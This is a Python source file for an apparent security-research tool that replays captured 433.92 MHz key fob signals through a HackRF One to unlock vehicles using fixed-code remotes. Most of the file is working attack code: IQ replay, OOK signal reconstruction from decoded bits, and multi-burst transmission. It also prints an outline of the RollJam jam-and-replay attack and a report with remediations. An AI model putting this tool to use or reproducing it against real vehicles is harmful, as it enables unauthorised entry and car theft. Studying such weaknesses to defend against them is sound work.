#!/usr/bin/env python3
"""
RF Key Fob Replay Attack Tool
================================
Author  : Usal Winodith (wincr4ck)
Research: Automotive Key Fob RF Security @ 433 MHz
Platform: HackRF One / RTL-SDR (RX only) / Simulation Mode

Description:
    Loads a previously captured key fob IQ signal and replays it
    via HackRF One (TX capable). For RTL-SDR users, provides signal
    reconstruction from decoded bit string for use with other TX hardware.

    Supports:
    - Raw IQ replay (exact sample replay via HackRF)
    - Reconstructed OOK replay from decoded bit string
    - Multi-burst replay (simulate button press)
    - Timing analysis and replay delay tuning

Attack Scenario:
    Attacker captures signal when victim presses key fob →
    Stores IQ capture → Replays signal later to unlock vehicle.
    Works ONLY against fixed-code systems (PT2262, EV1527, etc.)
    Rolling code systems (KeeLoq, AUT64) are NOT vulnerable to simple replay.

Disclaimer:
    For authorized security research and educational purposes only.
    Unauthorized use against vehicles you do not own is illegal.
    This tool is intended for demonstrating the weakness of fixed-code systems.
"""

import numpy as np
import time
import os
import json
import argparse
from datetime import datetime

# Optional HackRF import
try:
    import hackrf
    HACKRF_AVAILABLE = True
except ImportError:
    HACKRF_AVAILABLE = False

# Optional RTL-SDR (RX only — for verification)
try:
    import rtlsdr
    RTL_AVAILABLE = True
except ImportError:
    RTL_AVAILABLE = False


# ─────────────────────────────────────────────────
#  CONSTANTS
# ─────────────────────────────────────────────────
TARGET_FREQ_HZ   = 433.92e6
SAMPLE_RATE      = 2.048e6
TX_GAIN_DB       = 30          # HackRF TX gain (0–47 dB)
PULSE_UNIT_US    = 300         # Key fob pulse unit in microseconds
BURST_REPEAT     = 3           # Number of times to repeat signal per "press"
BURST_GAP_MS     = 10          # Gap between bursts in milliseconds
INTER_PRESS_MS   = 100         # Gap between simulated button presses


# ─────────────────────────────────────────────────
#  SIGNAL RECONSTRUCTION
# ─────────────────────────────────────────────────

def reconstruct_ook_signal(bit_string: str,
                            sample_rate: float = SAMPLE_RATE,
                            pulse_unit_us: float = PULSE_UNIT_US,
                            carrier_freq_offset: float = 0.0) -> np.ndarray:
    """
    Reconstruct OOK IQ signal from decoded bit string.

    This allows replaying a signal even if the original IQ capture
    is noisy — uses the clean decoded bit string instead.

    Args:
        bit_string          : Binary string of key fob payload
        sample_rate         : Output sample rate in Hz
        pulse_unit_us       : Pulse unit duration in microseconds
        carrier_freq_offset : Fine frequency offset in Hz (for tuning)

    Returns:
        np.ndarray: Complex IQ signal ready for TX
    """
    samples_per_unit = int(sample_rate * pulse_unit_us / 1e6)
    total_samples    = len(bit_string) * samples_per_unit
    ook_signal       = np.zeros(total_samples, dtype=np.float32)

    for i, bit in enumerate(bit_string):
        if bit == '1':
            start = i * samples_per_unit
            end   = start + samples_per_unit
            ook_signal[start:end] = 1.0

    # Generate carrier with optional fine frequency offset
    t         = np.arange(total_samples) / sample_rate
    carrier   = np.exp(2j * np.pi * carrier_freq_offset * t).astype(np.complex64)
    iq_signal = (ook_signal * carrier).astype(np.complex64)

    return iq_signal


def add_preamble(bit_string: str, preamble: str = "10101010", sync: str = "0000") -> str:
    """
    Add preamble and sync word before the payload for proper receiver sync.

    Args:
        bit_string : Raw payload bit string
        preamble   : Preamble pattern (alternating bits)
        sync       : Sync/gap word

    Returns:
        str: Full bit string with preamble + sync + payload
    """
    return preamble + sync + bit_string


def build_burst(bit_string: str, repeat: int = BURST_REPEAT,
                gap_bits: int = 32) -> str:
    """
    Build a multi-burst transmission (simulating holding button pressed).

    Real key fobs typically transmit the same code 3–12 times per button press.

    Args:
        bit_string : Payload bit string
        repeat     : Number of repetitions
        gap_bits   : Number of zero bits between bursts

    Returns:
        str: Full burst bit string
    """
    gap     = '0' * gap_bits
    payload = add_preamble(bit_string)
    return (payload + gap) * repeat


def prepare_iq_for_tx(iq_signal: np.ndarray) -> bytes:
    """
    Convert complex IQ numpy array to interleaved int8 bytes for HackRF TX.

    HackRF expects: [I0, Q0, I1, Q1, ...] as signed 8-bit integers.

    Args:
        iq_signal : Complex float IQ array

    Returns:
        bytes: Interleaved signed 8-bit I/Q bytes
    """
    # Normalize to [-127, 127]
    max_val = np.max(np.abs(iq_signal))
    if max_val > 0:
        iq_normalized = iq_signal / max_val * 127
    else:
        iq_normalized = iq_signal

    i_samples = np.real(iq_normalized).astype(np.int8)
    q_samples = np.imag(iq_normalized).astype(np.int8)

    # Interleave I and Q
    interleaved = np.empty(len(i_samples) * 2, dtype=np.int8)
    interleaved[0::2] = i_samples
    interleaved[1::2] = q_samples

    return interleaved.tobytes()


# ─────────────────────────────────────────────────
#  REPLAY ENGINE
# ─────────────────────────────────────────────────

def replay_raw_iq(iq_path: str, tx_gain: int = TX_GAIN_DB, repeat: int = 1):
    """
    Replay a raw captured IQ file via HackRF One.

    This is the most faithful replay — sends the exact captured samples
    back over the air. Most effective for simple OOK fixed code systems.

    Args:
        iq_path : Path to .iq capture file
        tx_gain : HackRF TX gain in dB (0–47)
        repeat  : Number of times to replay
    """
    if not HACKRF_AVAILABLE:
        print("[!] HackRF library not available.")
        print("    Install: pip install pyhackrf2")
        print("    Falling back to simulation mode — printing replay plan only.")
        simulate_replay_plan(iq_path, repeat)
        return

    print(f"[*] Loading capture: {iq_path}")
    iq_samples = np.fromfile(iq_path, dtype=np.complex64)
    tx_bytes   = prepare_iq_for_tx(iq_samples)

    print(f"[*] Initializing HackRF One ...")
    device = hackrf.HackRF()
    device.sample_rate = SAMPLE_RATE
    device.center_freq = TARGET_FREQ_HZ
    device.tx_gain     = tx_gain
    device.amplifier_on = False  # Keep amp off unless needed

    for i in range(repeat):
        print(f"[*] Transmitting burst {i+1}/{repeat} ...")
        device.start_tx(tx_bytes)
        time.sleep(len(iq_samples) / SAMPLE_RATE + 0.05)
        device.stop_tx()
        if i < repeat - 1:
            time.sleep(INTER_PRESS_MS / 1000)

    device.close()
    print(f"[+] Replay complete — {repeat} burst(s) transmitted")


def replay_from_bits(bit_string: str, tx_gain: int = TX_GAIN_DB,
                     repeat: int = 1, carrier_offset: float = 0.0):
    """
    Reconstruct and replay signal from decoded bit string via HackRF.

    More reliable than raw IQ replay when capture was noisy.
    Reconstructs a clean OOK waveform from the decoded bits.

    Args:
        bit_string     : Decoded key fob bit payload
        tx_gain        : HackRF TX gain in dB
        repeat         : Number of replay attempts
        carrier_offset : Fine frequency offset in Hz
    """
    print(f"[*] Reconstructing OOK signal from bit string ({len(bit_string)} bits)")

    burst_bits = build_burst(bit_string, repeat=BURST_REPEAT)
    iq_signal  = reconstruct_ook_signal(burst_bits,
                                         carrier_freq_offset=carrier_offset)
    tx_bytes   = prepare_iq_for_tx(iq_signal)

    if not HACKRF_AVAILABLE:
        print("[!] HackRF not available — simulation mode")
        print(f"    Would transmit: {len(burst_bits)} bits ({BURST_REPEAT} bursts)")
        print(f"    Signal duration: {len(iq_signal)/SAMPLE_RATE*1000:.1f} ms")
        print(f"    Frequency: {TARGET_FREQ_HZ/1e6:.2f} MHz")
        print(f"    TX Gain: {tx_gain} dB")
        print(f"    Carrier offset: {carrier_offset} Hz")
        print(f"\n[SIM] Replay would transmit bit string:")
        print(f"    {burst_bits[:64]}...")
        return

    device = hackrf.HackRF()
    device.sample_rate  = SAMPLE_RATE
    device.center_freq  = TARGET_FREQ_HZ
    device.tx_gain      = tx_gain
    device.amplifier_on = False

    for i in range(repeat):
        print(f"[*] Replaying reconstructed signal — attempt {i+1}/{repeat}")
        device.start_tx(tx_bytes)
        time.sleep(len(iq_signal) / SAMPLE_RATE + 0.1)
        device.stop_tx()
        if i < repeat - 1:
            time.sleep(INTER_PRESS_MS / 1000)

    device.close()
    print(f"[+] Bit-reconstructed replay complete")


def simulate_replay_plan(iq_path: str, repeat: int):
    """
    Simulate what the replay would do without TX hardware.
    Useful for demonstration and documentation.
    """
    iq_samples = np.fromfile(iq_path, dtype=np.complex64)
    duration_ms = len(iq_samples) / SAMPLE_RATE * 1000

    print("\n" + "="*60)
    print("  [SIMULATION] REPLAY PLAN")
    print("="*60)
    print(f"  Source file    : {iq_path}")
    print(f"  Sample count   : {len(iq_samples):,}")
    print(f"  Signal duration: {duration_ms:.1f} ms per burst")
    print(f"  TX frequency   : {TARGET_FREQ_HZ/1e6:.2f} MHz")
    print(f"  TX gain        : {TX_GAIN_DB} dB")
    print(f"  Repeat count   : {repeat}")
    print(f"  Total TX time  : {duration_ms * repeat:.1f} ms")
    print(f"\n  [INFO] To actually transmit, connect HackRF One")
    print(f"         and run: python replay.py --iq {iq_path} --hackrf")
    print("="*60 + "\n")


# ─────────────────────────────────────────────────
#  ATTACK SCENARIOS
# ─────────────────────────────────────────────────

def scenario_basic_replay(args):
    """
    Scenario 1: Basic Replay Attack
    ─────────────────────────────────
    Attacker captures key fob signal → waits → replays.
    Effective against: Fixed code systems (PT2262, EV1527)
    Not effective against: KeeLoq, AUT64, rolling code systems
    """
    print("\n[SCENARIO] Basic Replay Attack")
    print("  Step 1: Signal was captured (using capture.py)")
    print("  Step 2: Loading capture and replaying now...")
    print(f"  Step 3: Transmitting {args.repeat} time(s)\n")

    if args.bits:
        replay_from_bits(args.bits, tx_gain=args.gain, repeat=args.repeat)
    elif args.iq:
        replay_raw_iq(args.iq, tx_gain=args.gain, repeat=args.repeat)
    else:
        print("[!] Provide --iq <file> or --bits <bitstring>")


def scenario_jamming_replay(args):
    """
    Scenario 2: Jam & Capture (RollJam concept — educational only)
    ─────────────────────────────────────────────────────────────────
    This is the conceptual explanation of the RollJam attack
    discovered by Samy Kamkar against rolling code systems.

    How it works (concept only — NOT implemented here):
    1. Attacker jams the channel while capturing signal #1
    2. Victim presses button — signal #1 captured, but vehicle doesn't respond
    3. Victim presses button again — attacker captures signal #2, replays signal #1
    4. Vehicle opens with signal #1
    5. Attacker holds signal #2 for later use

    This is documented here for educational understanding of rolling code attacks.
    Full implementation requires FCC authorization for intentional jamming research.
    """
    print("\n[SCENARIO] RollJam Concept (Educational — NOT implemented)")
    print("─"*60)
    print("  This attack was discovered by Samy Kamkar (DEF CON 2015)")
    print()
    print("  Attack Flow:")
    print("  [1] Attacker simultaneously jams + captures → stores Signal_1")
    print("  [2] Victim presses fob → car doesn't open (jammed)")
    print("  [3] Victim presses again → attacker captures Signal_2,")
    print("      immediately replays Signal_1 → car opens")
    print("  [4] Attacker saves Signal_2 for future use")
    print()
    print("  Affected systems: KeeLoq (older implementations)")
    print("  Fixed by: Counter synchronization, time-limited codes")
    print("  Reference: DEF CON 23 — Samy Kamkar 'Drive It Like You Hacked It'")
    print("─"*60)


def scenario_replay_report(capture_path: str, analysis: dict) -> dict:
    """
    Generate a structured replay attack report.

    Args:
        capture_path : Path to IQ capture file
        analysis     : Signal analysis dict from capture.py

    Returns:
        dict: Structured attack report
    """
    encoding = analysis.get("encoding_type", "unknown")
    is_vulnerable = "FIXED" in encoding

    report = {
        "timestamp"       : datetime.now().isoformat(),
        "capture_file"    : capture_path,
        "frequency_mhz"   : TARGET_FREQ_HZ / 1e6,
        "encoding_type"   : encoding,
        "vulnerable"      : is_vulnerable,
        "attack_type"     : "Basic Replay" if is_vulnerable else "RollJam (advanced)",
        "cvss_score"      : "8.1 (HIGH)" if is_vulnerable else "6.8 (MEDIUM)",
        "cwe_id"          : "CWE-294: Authentication Bypass by Capture-Replay",
        "remediation"     : [
            "Upgrade to rolling code / KeeLoq+ implementation",
            "Implement time-based code expiration (TOTP-style)",
            "Use AES-128 encrypted rolling codes",
            "Add UWB (Ultra-Wideband) presence detection",
            "Implement challenge-response authentication"
        ] if is_vulnerable else [
            "Ensure KeeLoq counter synchronization window is minimal",
            "Monitor for RollJam attack patterns (double press + delayed open)",
            "Consider UWB-based proximity verification"
        ]
    }

    return report


# ─────────────────────────────────────────────────
#  CLI ENTRY POINT
# ─────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="RF Key Fob Replay Attack Tool — wincr4ck Security Research",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python replay.py --iq captures/capture_20250101_120000.iq --repeat 3
  python replay.py --bits 101100101011001010110010 --repeat 5
  python replay.py --iq captures/capture.iq --hackrf --gain 35
  python replay.py --scenario rolljam
        """
    )

    parser.add_argument('--iq',       type=str,  default=None, help='Path to .iq capture file')
    parser.add_argument('--bits',     type=str,  default=None, help='Bit string payload to replay')
    parser.add_argument('--repeat',   type=int,  default=3,    help='Number of replay attempts (default: 3)')
    parser.add_argument('--gain',     type=int,  default=TX_GAIN_DB, help=f'TX gain in dB (default: {TX_GAIN_DB})')
    parser.add_argument('--offset',   type=float,default=0.0,  help='Fine carrier frequency offset in Hz')
    parser.add_argument('--hackrf',   action='store_true',     help='Use HackRF One for transmission')
    parser.add_argument('--scenario', type=str,  default='basic', choices=['basic', 'rolljam'],
                        help='Attack scenario to run')

    args = parser.parse_args()

    print("\n" + "="*60)
    print("  RF KEY FOB REPLAY TOOL — wincr4ck Security Research")
    print("  Frequency: 433.92 MHz | Mode: " + ("HackRF TX" if args.hackrf else "Simulation"))
    print("="*60)

    if args.scenario == 'rolljam':
        scenario_jamming_replay(args)
    else:
        scenario_basic_replay(args)


if __name__ == "__main__":
    main()
